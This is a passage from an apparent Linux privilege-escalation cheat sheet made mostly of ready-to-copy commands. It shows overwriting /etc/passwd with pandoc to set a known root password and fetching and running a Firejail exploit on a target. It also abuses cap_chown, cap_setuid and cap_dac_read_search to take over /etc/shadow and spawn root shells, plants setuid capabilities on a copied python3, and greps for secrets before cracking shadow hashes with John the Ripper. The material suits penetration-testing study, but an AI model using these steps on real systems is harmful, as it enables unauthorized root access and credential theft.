    <path stroke-linecap="round" stroke-linejoin="round" d="M15.75 17.25v3.375c0 .621-.504 1.125-1.125 1.125h-9.75a1.125 1.125 0 01-1.125-1.125V7.875c0-.621.504-1.125 1.125-1.125H6.75a9.06 9.06 0 011.5.124m7.5 10.376h3.375c.621 0 1.125-.504 1.125-1.125V11.25c0-4.46-3.243-8.161-7.5-8.876a9.06 9.06 0 00-1.5-.124H9.375c-.621 0-1.125.504-1.125 1.125v3.5m7.5 10.375H9.375a1.125 1.125 0 01-1.125-1.125v-9.25m12 6.625v-1.875a3.375 3.375 0 00-3.375-3.375h-1.5a1.125 1.125 0 01-1.125-1.125v-1.5a3.375 3.375 0 00-3.375-3.375H9.75"></path>
</svg><span class="codecopy_result">Copied!</span></button></pre>
<h3 id="pandoc" tabindex="-1"><a href="#pandoc" class="header-anchor">Pandoc</a></h3>
<ol>
<li>Copy <strong><code>/etc/passwd</code></strong> and Update the Root Line</li>
</ol>
<pre class="codecopy_pre codecopy_pre_21"><code class="language-bash hljs"><span class="syntax-built_in">cp</span> /etc/passwd .
vim passwd
</code><button class="codecopy_copy" data-codecopy="21">
<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewbox="0 0 24 24" stroke-width="2.0" stroke="currentColor" class="w-6 h-6">
    <path stroke-linecap="round" stroke-linejoin="round" d="M15.75 17.25v3.375c0 .621-.504 1.125-1.125 1.125h-9.75a1.125 1.125 0 01-1.125-1.125V7.875c0-.621.504-1.125 1.125-1.125H6.75a9.06 9.06 0 011.5.124m7.5 10.376h3.375c.621 0 1.125-.504 1.125-1.125V11.25c0-4.46-3.243-8.161-7.5-8.876a9.06 9.06 0 00-1.5-.124H9.375c-.621 0-1.125.504-1.125 1.125v3.5m7.5 10.375H9.375a1.125 1.125 0 01-1.125-1.125v-9.25m12 6.625v-1.875a3.375 3.375 0 00-3.375-3.375h-1.5a1.125 1.125 0 01-1.125-1.125v-1.5a3.375 3.375 0 00-3.375-3.375H9.75"></path>
</svg><span class="codecopy_result">Copied!</span></button></pre>
<p>Then update  <strong>"root:x:..."</strong> to <strong>"root:password123:..."</strong>.</p>
<ol start="2">
<li>Replace with Our New Passwd File</li>
</ol>
<p>Using <strong><code>pandoc</code></strong> command, we can replace the original <strong><code>/etc/passwd</code></strong> with our updated <strong><code>passwd</code></strong> file.</p>
<pre class="codecopy_pre codecopy_pre_22"><code class="language-sh hljs language-bash">pandoc ./passwd -t plain -o /etc/passwd
</code><button class="codecopy_copy" data-codecopy="22">
<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewbox="0 0 24 24" stroke-width="2.0" stroke="currentColor" class="w-6 h-6">
    <path stroke-linecap="round" stroke-linejoin="round" d="M15.75 17.25v3.375c0 .621-.504 1.125-1.125 1.125h-9.75a1.125 1.125 0 01-1.125-1.125V7.875c0-.621.504-1.125 1.125-1.125H6.75a9.06 9.06 0 011.5.124m7.5 10.376h3.375c.621 0 1.125-.504 1.125-1.125V11.25c0-4.46-3.243-8.161-7.5-8.876a9.06 9.06 0 00-1.5-.124H9.375c-.621 0-1.125.504-1.125 1.125v3.5m7.5 10.375H9.375a1.125 1.125 0 01-1.125-1.125v-9.25m12 6.625v-1.875a3.375 3.375 0 00-3.375-3.375h-1.5a1.125 1.125 0 01-1.125-1.125v-1.5a3.375 3.375 0 00-3.375-3.375H9.75"></path>
</svg><span class="codecopy_result">Copied!</span></button></pre>
<p>Now we can login as root using new password.</p>
<pre class="codecopy_pre codecopy_pre_23"><code class="language-bash hljs">su root
Password: password123
</code><button class="codecopy_copy" data-codecopy="23">
<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewbox="0 0 24 24" stroke-width="2.0" stroke="currentColor" class="w-6 h-6">
    <path stroke-linecap="round" stroke-linejoin="round" d="M15.75 17.25v3.375c0 .621-.504 1.125-1.125 1.125h-9.75a1.125 1.125 0 01-1.125-1.125V7.875c0-.621.504-1.125 1.125-1.125H6.75a9.06 9.06 0 011.5.124m7.5 10.376h3.375c.621 0 1.125-.504 1.125-1.125V11.25c0-4.46-3.243-8.161-7.5-8.876a9.06 9.06 0 00-1.5-.124H9.375c-.621 0-1.125.504-1.125 1.125v3.5m7.5 10.375H9.375a1.125 1.125 0 01-1.125-1.125v-9.25m12 6.625v-1.875a3.375 3.375 0 00-3.375-3.375h-1.5a1.125 1.125 0 01-1.125-1.125v-1.5a3.375 3.375 0 00-3.375-3.375H9.75"></path>
</svg><span class="codecopy_result">Copied!</span></button></pre>
<h3 id="firejail" tabindex="-1"><a href="#firejail" class="header-anchor">Firejail</a></h3>
<p><a href="https://www.openwall.com/lists/oss-security/2022/06/08/10/1">This exploit</a> is useful.</p>
<pre class="codecopy_pre codecopy_pre_24"><code class="language-bash hljs"><span class="syntax-comment"># Download it in local machine</span>
wget https://www.openwall.com/lists/oss-security/2022/06/08/10/1 -O exploit.py

<span class="syntax-comment"># Transfer it to target machine</span>
wget http://&lt;local-ip&gt;:8000/exploit.py
python3 exploit.py &amp;
firejail --<span class="syntax-built_in">join</span>=&lt;PID&gt;
su -
</code><button class="codecopy_copy" data-codecopy="24">
<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewbox="0 0 24 24" stroke-width="2.0" stroke="currentColor" class="w-6 h-6">
    <path stroke-linecap="round" stroke-linejoin="round" d="M15.75 17.25v3.375c0 .621-.504 1.125-1.125 1.125h-9.75a1.125 1.125 0 01-1.125-1.125V7.875c0-.621.504-1.125 1.125-1.125H6.75a9.06 9.06 0 011.5.124m7.5 10.376h3.375c.621 0 1.125-.504 1.125-1.125V11.25c0-4.46-3.243-8.161-7.5-8.876a9.06 9.06 0 00-1.5-.124H9.375c-.621 0-1.125.504-1.125 1.125v3.5m7.5 10.375H9.375a1.125 1.125 0 01-1.125-1.125v-9.25m12 6.625v-1.875a3.375 3.375 0 00-3.375-3.375h-1.5a1.125 1.125 0 01-1.125-1.125v-1.5a3.375 3.375 0 00-3.375-3.375H9.75"></path>
</svg><span class="codecopy_result">Copied!</span></button></pre>
<br>
<h2 id="writable-directories-%26-files" tabindex="-1"><a href="#writable-directories-%26-files" class="header-anchor">Writable Directories &amp; Files</a></h2>
<pre class="codecopy_pre codecopy_pre_25"><code class="language-sh hljs language-bash"><span class="syntax-comment"># Writable directories</span>
find / -writable 2&gt;/dev/null | <span class="syntax-built_in">cut</span> -d <span class="syntax-string">"/"</span> -f 2,3 | <span class="syntax-built_in">sort</span> -u

<span class="syntax-comment"># System service files</span>
find / -writable -name <span class="syntax-string">"*.service"</span> 2&gt;/dev/null
</code><button class="codecopy_copy" data-codecopy="25">
<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewbox="0 0 24 24" stroke-width="2.0" stroke="currentColor" class="w-6 h-6">
    <path stroke-linecap="round" stroke-linejoin="round" d="M15.75 17.25v3.375c0 .621-.504 1.125-1.125 1.125h-9.75a1.125 1.125 0 01-1.125-1.125V7.875c0-.621.504-1.125 1.125-1.125H6.75a9.06 9.06 0 011.5.124m7.5 10.376h3.375c.621 0 1.125-.504 1.125-1.125V11.25c0-4.46-3.243-8.161-7.5-8.876a9.06 9.06 0 00-1.5-.124H9.375c-.621 0-1.125.504-1.125 1.125v3.5m7.5 10.375H9.375a1.125 1.125 0 01-1.125-1.125v-9.25m12 6.625v-1.875a3.375 3.375 0 00-3.375-3.375h-1.5a1.125 1.125 0 01-1.125-1.125v-1.5a3.375 3.375 0 00-3.375-3.375H9.75"></path>
</svg><span class="codecopy_result">Copied!</span></button></pre>
<br>
<h2 id="capabilities" tabindex="-1"><a href="#capabilities" class="header-anchor">Capabilities</a></h2>
<p>To find files that are set capabilities.</p>
<pre class="codecopy_pre codecopy_pre_26"><code class="language-sh hljs language-bash"><span class="syntax-built_in">getcap</span> -r / 2&gt;/dev/null
</code><button class="codecopy_copy" data-codecopy="26">
<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewbox="0 0 24 24" stroke-width="2.0" stroke="currentColor" class="w-6 h-6">
    <path stroke-linecap="round" stroke-linejoin="round" d="M15.75 17.25v3.375c0 .621-.504 1.125-1.125 1.125h-9.75a1.125 1.125 0 01-1.125-1.125V7.875c0-.621.504-1.125 1.125-1.125H6.75a9.06 9.06 0 011.5.124m7.5 10.376h3.375c.621 0 1.125-.504 1.125-1.125V11.25c0-4.46-3.243-8.161-7.5-8.876a9.06 9.06 0 00-1.5-.124H9.375c-.621 0-1.125.504-1.125 1.125v3.5m7.5 10.375H9.375a1.125 1.125 0 01-1.125-1.125v-9.25m12 6.625v-1.875a3.375 3.375 0 00-3.375-3.375h-1.5a1.125 1.125 0 01-1.125-1.125v-1.5a3.375 3.375 0 00-3.375-3.375H9.75"></path>
</svg><span class="codecopy_result">Copied!</span></button></pre>
<h3 id="cap_chown" tabindex="-1"><a href="#cap_chown" class="header-anchor">cap_chown</a></h3>
<p>First we need to check the current user id by executing 'id' command.</p>
<pre class="codecopy_pre codecopy_pre_27"><code class="language-bash hljs"><span class="syntax-built_in">id</span>

uid=33(www-data) gid=33(www-data) <span class="syntax-built_in">groups</span>=33(www-data)
</code><button class="codecopy_copy" data-codecopy="27">
<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewbox="0 0 24 24" stroke-width="2.0" stroke="currentColor" class="w-6 h-6">
    <path stroke-linecap="round" stroke-linejoin="round" d="M15.75 17.25v3.375c0 .621-.504 1.125-1.125 1.125h-9.75a1.125 1.125 0 01-1.125-1.125V7.875c0-.621.504-1.125 1.125-1.125H6.75a9.06 9.06 0 011.5.124m7.5 10.376h3.375c.621 0 1.125-.504 1.125-1.125V11.25c0-4.46-3.243-8.161-7.5-8.876a9.06 9.06 0 00-1.5-.124H9.375c-.621 0-1.125.504-1.125 1.125v3.5m7.5 10.375H9.375a1.125 1.125 0 01-1.125-1.125v-9.25m12 6.625v-1.875a3.375 3.375 0 00-3.375-3.375h-1.5a1.125 1.125 0 01-1.125-1.125v-1.5a3.375 3.375 0 00-3.375-3.375H9.75"></path>
</svg><span class="codecopy_result">Copied!</span></button></pre>
<p>Then execute the following command to modify the file owner to the current user.<br>
Replace the attribute numbers with the current user id.</p>
<pre class="codecopy_pre codecopy_pre_28"><code class="language-bash hljs"><span class="syntax-comment"># Python</span>
python -c <span class="syntax-string">'import os;os.chown("/etc/shadow",33,33)'</span>

<span class="syntax-comment"># Ruby</span>
ruby -e <span class="syntax-string">'require "fileutils"; FileUtils.chown(33, 33, "/etc/shadow")'</span>
<span class="syntax-comment"># directories also can be modified.</span>
ruby -e <span class="syntax-string">'require "fileutils"; FileUtils.chown(33, 33, "/root")'</span>
</code><button class="codecopy_copy" data-codecopy="28">
<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewbox="0 0 24 24" stroke-width="2.0" stroke="currentColor" class="w-6 h-6">
    <path stroke-linecap="round" stroke-linejoin="round" d="M15.75 17.25v3.375c0 .621-.504 1.125-1.125 1.125h-9.75a1.125 1.125 0 01-1.125-1.125V7.875c0-.621.504-1.125 1.125-1.125H6.75a9.06 9.06 0 011.5.124m7.5 10.376h3.375c.621 0 1.125-.504 1.125-1.125V11.25c0-4.46-3.243-8.161-7.5-8.876a9.06 9.06 0 00-1.5-.124H9.375c-.621 0-1.125.504-1.125 1.125v3.5m7.5 10.375H9.375a1.125 1.125 0 01-1.125-1.125v-9.25m12 6.625v-1.875a3.375 3.375 0 00-3.375-3.375h-1.5a1.125 1.125 0 01-1.125-1.125v-1.5a3.375 3.375 0 00-3.375-3.375H9.75"></path>
</svg><span class="codecopy_result">Copied!</span></button></pre>
<h3 id="cap_setuid" tabindex="-1"><a href="#cap_setuid" class="header-anchor">cap_setuid</a></h3>
<pre class="codecopy_pre codecopy_pre_29"><code class="language-bash hljs"><span class="syntax-comment"># Perl</span>
perl -e <span class="syntax-string">'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'</span>

<span class="syntax-comment"># PHP</span>
php -r <span class="syntax-string">"posix_setuid(0); system('<span class="syntax-variable">$CMD</span>');"</span>

<span class="syntax-comment"># Python</span>
python -c <span class="syntax-string">'import os; os.setuid(0); os.system("/bin/bash")'</span>
</code><button class="codecopy_copy" data-codecopy="29">
<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewbox="0 0 24 24" stroke-width="2.0" stroke="currentColor" class="w-6 h-6">
    <path stroke-linecap="round" stroke-linejoin="round" d="M15.75 17.25v3.375c0 .621-.504 1.125-1.125 1.125h-9.75a1.125 1.125 0 01-1.125-1.125V7.875c0-.621.504-1.125 1.125-1.125H6.75a9.06 9.06 0 011.5.124m7.5 10.376h3.375c.621 0 1.125-.504 1.125-1.125V11.25c0-4.46-3.243-8.161-7.5-8.876a9.06 9.06 0 00-1.5-.124H9.375c-.621 0-1.125.504-1.125 1.125v3.5m7.5 10.375H9.375a1.125 1.125 0 01-1.125-1.125v-9.25m12 6.625v-1.875a3.375 3.375 0 00-3.375-3.375h-1.5a1.125 1.125 0 01-1.125-1.125v-1.5a3.375 3.375 0 00-3.375-3.375H9.75"></path>
</svg><span class="codecopy_result">Copied!</span></button></pre>
<h3 id="cap_net_raw" tabindex="-1"><a href="#cap_net_raw" class="header-anchor">cap_net_raw</a></h3>
<pre class="codecopy_pre codecopy_pre_30"><code class="language-bash hljs"><span class="syntax-comment"># Tcpdump - we can sniff sensitive information by running tcpdump for a while.</span>
tcpdump -i lo -A
</code><button class="codecopy_copy" data-codecopy="30">
<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewbox="0 0 24 24" stroke-width="2.0" stroke="currentColor" class="w-6 h-6">
    <path stroke-linecap="round" stroke-linejoin="round" d="M15.75 17.25v3.375c0 .621-.504 1.125-1.125 1.125h-9.75a1.125 1.125 0 01-1.125-1.125V7.875c0-.621.504-1.125 1.125-1.125H6.75a9.06 9.06 0 011.5.124m7.5 10.376h3.375c.621 0 1.125-.504 1.125-1.125V11.25c0-4.46-3.243-8.161-7.5-8.876a9.06 9.06 0 00-1.5-.124H9.375c-.621 0-1.125.504-1.125 1.125v3.5m7.5 10.375H9.375a1.125 1.125 0 01-1.125-1.125v-9.25m12 6.625v-1.875a3.375 3.375 0 00-3.375-3.375h-1.5a1.125 1.125 0 01-1.125-1.125v-1.5a3.375 3.375 0 00-3.375-3.375H9.75"></path>
</svg><span class="codecopy_result">Copied!</span></button></pre>
<h3 id="cap_dac_read_search" tabindex="-1"><a href="#cap_dac_read_search" class="header-anchor">cap_dac_read_search</a></h3>
<p>Bypass file read permission checks and directory read and execute permission checks.</p>
<pre class="codecopy_pre codecopy_pre_31"><code class="language-bash hljs"><span class="syntax-comment"># Tar (https://gtfobins.github.io/gtfobins/tar/)</span>
LFILE=/etc/shadow
tar xf <span class="syntax-string">"<span class="syntax-variable">$LFILE</span>"</span> -I <span class="syntax-string">'/bin/sh -c "cat 1&gt;&amp;2"'</span>
</code><button class="codecopy_copy" data-codecopy="31">
<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewbox="0 0 24 24" stroke-width="2.0" stroke="currentColor" class="w-6 h-6">
    <path stroke-linecap="round" stroke-linejoin="round" d="M15.75 17.25v3.375c0 .621-.504 1.125-1.125 1.125h-9.75a1.125 1.125 0 01-1.125-1.125V7.875c0-.621.504-1.125 1.125-1.125H6.75a9.06 9.06 0 011.5.124m7.5 10.376h3.375c.621 0 1.125-.504 1.125-1.125V11.25c0-4.46-3.243-8.161-7.5-8.876a9.06 9.06 0 00-1.5-.124H9.375c-.621 0-1.125.504-1.125 1.125v3.5m7.5 10.375H9.375a1.125 1.125 0 01-1.125-1.125v-9.25m12 6.625v-1.875a3.375 3.375 0 00-3.375-3.375h-1.5a1.125 1.125 0 01-1.125-1.125v-1.5a3.375 3.375 0 00-3.375-3.375H9.75"></path>
</svg><span class="codecopy_result">Copied!</span></button></pre>
<br>
<h2 id="set-capabilities" tabindex="-1"><a href="#set-capabilities" class="header-anchor">Set Capabilities</a></h2>
<pre class="codecopy_pre codecopy_pre_32"><code class="language-sh hljs language-bash"><span class="syntax-built_in">setcap</span> cap_setuid+ep /path/to/binary
</code><button class="codecopy_copy" data-codecopy="32">
<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewbox="0 0 24 24" stroke-width="2.0" stroke="currentColor" class="w-6 h-6">
    <path stroke-linecap="round" stroke-linejoin="round" d="M15.75 17.25v3.375c0 .621-.504 1.125-1.125 1.125h-9.75a1.125 1.125 0 01-1.125-1.125V7.875c0-.621.504-1.125 1.125-1.125H6.75a9.06 9.06 0 011.5.124m7.5 10.376h3.375c.621 0 1.125-.504 1.125-1.125V11.25c0-4.46-3.243-8.161-7.5-8.876a9.06 9.06 0 00-1.5-.124H9.375c-.621 0-1.125.504-1.125 1.125v3.5m7.5 10.375H9.375a1.125 1.125 0 01-1.125-1.125v-9.25m12 6.625v-1.875a3.375 3.375 0 00-3.375-3.375h-1.5a1.125 1.125 0 01-1.125-1.125v-1.5a3.375 3.375 0 00-3.375-3.375H9.75"></path>
</svg><span class="codecopy_result">Copied!</span></button></pre>
<p>If you found the <strong>setcap</strong> with <strong>SUID</strong>, you can manipulate commands like Python.</p>
<pre class="codecopy_pre codecopy_pre_33"><code class="language-sh hljs language-bash"><span class="syntax-built_in">cp</span> /usr/bin/python3 /home/&lt;current-user&gt;/python3
<span class="syntax-built_in">setcap</span> cap_setuid+ep /home/&lt;current-user&gt;/python3
</code><button class="codecopy_copy" data-codecopy="33">
<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewbox="0 0 24 24" stroke-width="2.0" stroke="currentColor" class="w-6 h-6">
    <path stroke-linecap="round" stroke-linejoin="round" d="M15.75 17.25v3.375c0 .621-.504 1.125-1.125 1.125h-9.75a1.125 1.125 0 01-1.125-1.125V7.875c0-.621.504-1.125 1.125-1.125H6.75a9.06 9.06 0 011.5.124m7.5 10.376h3.375c.621 0 1.125-.504 1.125-1.125V11.25c0-4.46-3.243-8.161-7.5-8.876a9.06 9.06 0 00-1.5-.124H9.375c-.621 0-1.125.504-1.125 1.125v3.5m7.5 10.375H9.375a1.125 1.125 0 01-1.125-1.125v-9.25m12 6.625v-1.875a3.375 3.375 0 00-3.375-3.375h-1.5a1.125 1.125 0 01-1.125-1.125v-1.5a3.375 3.375 0 00-3.375-3.375H9.75"></path>
</svg><span class="codecopy_result">Copied!</span></button></pre>
<p>Then get a root shell.</p>
<pre class="codecopy_pre codecopy_pre_34"><code class="language-sh hljs language-bash">/home/&lt;current-user&gt;/python3 -c <span class="syntax-string">'import os; os.setuid(0); os.system("/bin/bash")'</span>
</code><button class="codecopy_copy" data-codecopy="34">
<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewbox="0 0 24 24" stroke-width="2.0" stroke="currentColor" class="w-6 h-6">
    <path stroke-linecap="round" stroke-linejoin="round" d="M15.75 17.25v3.375c0 .621-.504 1.125-1.125 1.125h-9.75a1.125 1.125 0 01-1.125-1.125V7.875c0-.621.504-1.125 1.125-1.125H6.75a9.06 9.06 0 011.5.124m7.5 10.376h3.375c.621 0 1.125-.504 1.125-1.125V11.25c0-4.46-3.243-8.161-7.5-8.876a9.06 9.06 0 00-1.5-.124H9.375c-.621 0-1.125.504-1.125 1.125v3.5m7.5 10.375H9.375a1.125 1.125 0 01-1.125-1.125v-9.25m12 6.625v-1.875a3.375 3.375 0 00-3.375-3.375h-1.5a1.125 1.125 0 01-1.125-1.125v-1.5a3.375 3.375 0 00-3.375-3.375H9.75"></path>
</svg><span class="codecopy_result">Copied!</span></button></pre>
<br>
<h2 id="sensitive-contents-in-files" tabindex="-1"><a href="#sensitive-contents-in-files" class="header-anchor">Sensitive Contents in Files</a></h2>
<pre class="codecopy_pre codecopy_pre_35"><code class="language-sh hljs language-bash"><span class="syntax-comment"># -r: recursive</span>
<span class="syntax-comment"># -n: line number</span>
<span class="syntax-comment"># -i: ignore case</span>
grep -rni root ./
grep -rni password ./
grep -rni passwd ./
grep -rni db_password ./
grep -rni db_passwd ./

<span class="syntax-comment"># Find user's information</span>
grep -rni root ./
grep -rni john ./

<span class="syntax-comment"># -e: OR Searching</span>
grep -re admin -re root -re credential -re password ./
grep -re secret -re key ./

<span class="syntax-comment"># -v: Exclude</span>
grep -rni password -v node_modules ./

<span class="syntax-comment"># -E: regex</span>
grep -riE <span class="syntax-string">'flag{.*}'</span> ./

<span class="syntax-comment"># IP Address Searching</span>
grep -rE -o <span class="syntax-string">"([0-9]{1,3}[\.]){3}[0-9]{1,3}"</span> ./

<span class="syntax-comment"># -h: no output filenames</span>
grep -h root ./
</code><button class="codecopy_copy" data-codecopy="35">
<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewbox="0 0 24 24" stroke-width="2.0" stroke="currentColor" class="w-6 h-6">
    <path stroke-linecap="round" stroke-linejoin="round" d="M15.75 17.25v3.375c0 .621-.504 1.125-1.125 1.125h-9.75a1.125 1.125 0 01-1.125-1.125V7.875c0-.621.504-1.125 1.125-1.125H6.75a9.06 9.06 0 011.5.124m7.5 10.376h3.375c.621 0 1.125-.504 1.125-1.125V11.25c0-4.46-3.243-8.161-7.5-8.876a9.06 9.06 0 00-1.5-.124H9.375c-.621 0-1.125.504-1.125 1.125v3.5m7.5 10.375H9.375a1.125 1.125 0 01-1.125-1.125v-9.25m12 6.625v-1.875a3.375 3.375 0 00-3.375-3.375h-1.5a1.125 1.125 0 01-1.125-1.125v-1.5a3.375 3.375 0 00-3.375-3.375H9.75"></path>
</svg><span class="codecopy_result">Copied!</span></button></pre>
<br>
<h2 id="disks-(drives)" tabindex="-1"><a href="#disks-(drives)" class="header-anchor">Disks (Drives)</a></h2>
<p>List disks information on the target system.</p>
<pre class="codecopy_pre codecopy_pre_36"><code class="language-bash hljs"><span class="syntax-comment"># Find mounted folders</span>
findmnt
<span class="syntax-comment"># List information about block drives</span>
lsblk
<span class="syntax-comment"># or</span>
fdisk -l
<span class="syntax-comment"># or</span>
<span class="syntax-built_in">ls</span> -al /dev | grep disk

<span class="syntax-comment"># --------------------------------------------------</span>

<span class="syntax-comment"># Result examples</span>
NAME    MAJ:MIN RM SIZE RO TYPE MOUNTPOINT
xvda    202:0    0  40G  0 disk 
└─xvda1 202:1    0  40G  0 part /etc/hosts
</code><button class="codecopy_copy" data-codecopy="36">
<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewbox="0 0 24 24" stroke-width="2.0" stroke="currentColor" class="w-6 h-6">
    <path stroke-linecap="round" stroke-linejoin="round" d="M15.75 17.25v3.375c0 .621-.504 1.125-1.125 1.125h-9.75a1.125 1.125 0 01-1.125-1.125V7.875c0-.621.504-1.125 1.125-1.125H6.75a9.06 9.06 0 011.5.124m7.5 10.376h3.375c.621 0 1.125-.504 1.125-1.125V11.25c0-4.46-3.243-8.161-7.5-8.876a9.06 9.06 0 00-1.5-.124H9.375c-.621 0-1.125.504-1.125 1.125v3.5m7.5 10.375H9.375a1.125 1.125 0 01-1.125-1.125v-9.25m12 6.625v-1.875a3.375 3.375 0 00-3.375-3.375h-1.5a1.125 1.125 0 01-1.125-1.125v-1.5a3.375 3.375 0 00-3.375-3.375H9.75"></path>
</svg><span class="codecopy_result">Copied!</span></button></pre>
<p>If we find the drives, we can mount it.</p>
<pre class="codecopy_pre codecopy_pre_37"><code class="language-bash hljs"><span class="syntax-built_in">mkdir</span> -p /mnt/tmp
mount /dev/xvda1 /mnt/tmp
</code><button class="codecopy_copy" data-codecopy="37">
<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewbox="0 0 24 24" stroke-width="2.0" stroke="currentColor" class="w-6 h-6">
    <path stroke-linecap="round" stroke-linejoin="round" d="M15.75 17.25v3.375c0 .621-.504 1.125-1.125 1.125h-9.75a1.125 1.125 0 01-1.125-1.125V7.875c0-.621.504-1.125 1.125-1.125H6.75a9.06 9.06 0 011.5.124m7.5 10.376h3.375c.621 0 1.125-.504 1.125-1.125V11.25c0-4.46-3.243-8.161-7.5-8.876a9.06 9.06 0 00-1.5-.124H9.375c-.621 0-1.125.504-1.125 1.125v3.5m7.5 10.375H9.375a1.125 1.125 0 01-1.125-1.125v-9.25m12 6.625v-1.875a3.375 3.375 0 00-3.375-3.375h-1.5a1.125 1.125 0 01-1.125-1.125v-1.5a3.375 3.375 0 00-3.375-3.375H9.75"></path>
</svg><span class="codecopy_result">Copied!</span></button></pre>
<br>
<h2 id="crack-user-passwords" tabindex="-1"><a href="#crack-user-passwords" class="header-anchor">Crack User Passwords</a></h2>
<p>If we can access <strong>/etc/passwd</strong> and <strong>/etc/shadow</strong> as well, we can crack user passwords using <strong>unshadow</strong> and <strong>John The Ripper</strong>.</p>
<h3 id="1.-copy-files" tabindex="-1"><a href="#1.-copy-files" class="header-anchor">1. Copy Files</a></h3>
<pre class="codecopy_pre codecopy_pre_38"><code class="language-sh hljs language-bash"><span class="syntax-built_in">cp</span> /etc/passwd ./passwd.txt
<span class="syntax-built_in">cp</span> /etc/shadow ./shadow.txt
</code><button class="codecopy_copy" data-codecopy="38">
<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewbox="0 0 24 24" stroke-width="2.0" stroke="currentColor" class="w-6 h-6">
    <path stroke-linecap="round" stroke-linejoin="round" d="M15.75 17.25v3.375c0 .621-.504 1.125-1.125 1.125h-9.75a1.125 1.125 0 01-1.125-1.125V7.875c0-.621.504-1.125 1.125-1.125H6.75a9.06 9.06 0 011.5.124m7.5 10.376h3.375c.621 0 1.125-.504 1.125-1.125V11.25c0-4.46-3.243-8.161-7.5-8.876a9.06 9.06 0 00-1.5-.124H9.375c-.621 0-1.125.504-1.125 1.125v3.5m7.5 10.375H9.375a1.125 1.125 0 01-1.125-1.125v-9.25m12 6.625v-1.875a3.375 3.375 0 00-3.375-3.375h-1.5a1.125 1.125 0 01-1.125-1.125v-1.5a3.375 3.375 0 00-3.375-3.375H9.75"></path>
</svg><span class="codecopy_result">Copied!</span></button></pre>
<h3 id="2.-combines-two-files" tabindex="-1"><a href="#2.-combines-two-files" class="header-anchor">2. Combines Two Files</a></h3>
<pre class="codecopy_pre codecopy_pre_39"><code class="language-sh hljs language-bash">unshadow passwd.txt shadow.txt &gt; passwords.txt
</code><button class="codecopy_copy" data-codecopy="39">
<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewbox="0 0 24 24" stroke-width="2.0" stroke="currentColor" class="w-6 h-6">
    <path stroke-linecap="round" stroke-linejoin="round" d="M15.75 17.25v3.375c0 .621-.504 1.125-1.125 1.125h-9.75a1.125 1.125 0 01-1.125-1.125V7.875c0-.621.504-1.125 1.125-1.125H6.75a9.06 9.06 0 011.5.124m7.5 10.376h3.375c.621 0 1.125-.504 1.125-1.125V11.25c0-4.46-3.243-8.161-7.5-8.876a9.06 9.06 0 00-1.5-.124H9.375c-.621 0-1.125.504-1.125 1.125v3.5m7.5 10.375H9.375a1.125 1.125 0 01-1.125-1.125v-9.25m12 6.625v-1.875a3.375 3.375 0 00-3.375-3.375h-1.5a1.125 1.125 0 01-1.125-1.125v-1.5a3.375 3.375 0 00-3.375-3.375H9.75"></path>
</svg><span class="codecopy_result">Copied!</span></button></pre>
<h3 id="3.-crack-passwords" tabindex="-1"><a href="#3.-crack-passwords" class="header-anchor">3. Crack Passwords</a></h3>
<pre class="codecopy_pre codecopy_pre_40"><code class="language-sh hljs language-bash">john --wordlist=wordlist.txt passwords.txt

<span class="syntax-comment"># If the hash in /etc/shadow contains the $y$ prefix, specify the hash format to "crypt".</span>
<span class="syntax-comment"># btw, $ye$ is the scheme of the yescrypt.</span>
john --format=crypt --wordlist=wordlist.txt passwords.txt
</code><button class="codecopy_copy" data-codecopy="40">
<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewbox="0 0 24 24" stroke-width="2.0" stroke="currentColor" class="w-6 h-6">
    <path stroke-linecap="round" stroke-linejoin="round" d="M15.75 17.25v3.375c0 .621-.504 1.125-1.125 1.125h-9.75a1.125 1.125 0 01-1.125-1.125V7.875c0-.621.504-1.125 1.125-1.125H6.75a9.06 9.06 0 011.5.124m7.5 10.376h3.375c.621 0 1.125-.504 1.125-1.125V11.25c0-4.46-3.243-8.161-7.5-8.876a9.06 9.06 0 00-1.5-.124H9.375c-.621 0-1.125.504-1.125 1.125v3.5m7.5 10.375H9.375a1.125 1.125 0 01-1.125-1.125v-9.25m12 6.625v-1.875a3.375 3.375 0 00-3.375-3.375h-1.5a1.125 1.125 0 01-1.125-1.125v-1.5a3.375 3.375 0 00-3.375-3.375H9.75"></path>
</svg><span class="codecopy_result">Copied!</span></button></pre>
<br>
<h2 id="execute-commands-as-root-privilege" tabindex="-1"><a href="#execute-commands-as-root-privilege" class="header-anchor">Execute Commands as Root Privilege</a></h2>
<h3 id="change-shebang-in-shell-script" tabindex="-1"><a href="#change-shebang-in-shell-script" class="header-anchor">Change Shebang in Shell Script</a></h3>
<p>Add "-p" option at the first line to execute the script as root privilege.</p>
<pre class="codecopy_pre codecopy_pre_41"><code class="language-sh hljs language-bash"><span class="syntax-meta">#!/bin/bash -p</span>
<span class="syntax-built_in">whoami</span>
</code><button class="codecopy_copy" data-codecopy="41">
<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewbox="0 0 24 24" stroke-width="2.0" stroke="currentColor" class="w-6 h-6">
